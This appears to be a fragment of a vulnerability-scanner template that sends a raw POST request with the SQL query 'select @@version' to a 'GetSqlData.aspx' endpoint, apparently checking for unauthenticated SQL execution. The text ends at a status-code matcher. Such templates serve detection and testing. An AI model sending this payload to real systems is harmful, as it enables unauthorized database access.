http:
  - raw:
      - |
        POST /C6/Control/GetSqlData.aspx/.ashx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        select @@version

    matchers-condition: and
    matchers:
      - type: status
        part: status_code
